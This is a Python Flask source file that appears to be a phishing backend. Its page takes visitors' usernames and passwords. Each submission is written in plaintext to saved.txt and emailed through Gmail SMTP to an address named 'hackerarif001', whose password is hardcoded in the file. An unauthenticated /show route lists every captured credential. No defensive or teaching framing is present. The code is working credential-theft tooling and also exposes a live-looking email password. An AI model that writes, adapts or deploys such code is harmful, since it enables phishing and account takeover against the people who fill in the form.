import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, render_template

EMAIL_ADDRESS = "hackerarif001@gmail.com"
EMAIL_PASSWORD = "dchoxydmykgpbxbz"

app = Flask(__name__)

def send_email(username, password):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = "اطلاعات جدید فرم دریافت شد ✅"

    body = f"Username: {username}\nPassword: {password}"
    msg.attach(MIMEText(body, 'plain'))

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open('saved.txt', 'a') as file:
            file.write(f"Username: {username} | Password: {password}\n")
        send_email(username, password)
    return render_template('index.html')

@app.route('/show')
def show_data():
    try:
        with open('saved.txt', 'r') as f:
            content = f.read()
    except FileNotFoundError:
        content = "هیچ اطلاعاتی ثبت نشده هنوز."

    return f"<h2>اطلاعات فرم ثبت‌شده:</h2><pre>{content}</pre>"

app.run(host='0.0.0.0', port=8080)
